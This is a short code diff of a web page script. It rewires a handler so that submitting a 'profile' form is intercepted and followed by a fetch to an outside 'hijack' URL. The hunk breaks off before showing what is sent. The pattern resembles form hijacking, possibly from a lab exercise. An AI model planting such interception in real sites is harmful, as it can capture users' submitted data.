@@ -17,8 +17,8 @@ hamburger.addEventListener('click', function () {
 });
 
 window.addEventListener('load', event => {
-    var btn = document.getElementById("btn-submit")
-    btn.addEventListener('click', event => {
+    var form = document.getElementById("profile")
+    form.addEventListener('submit', event => {
         event.preventDefault()
         fetch("https://bitsflip.io/hijack", {
             method: "GET",
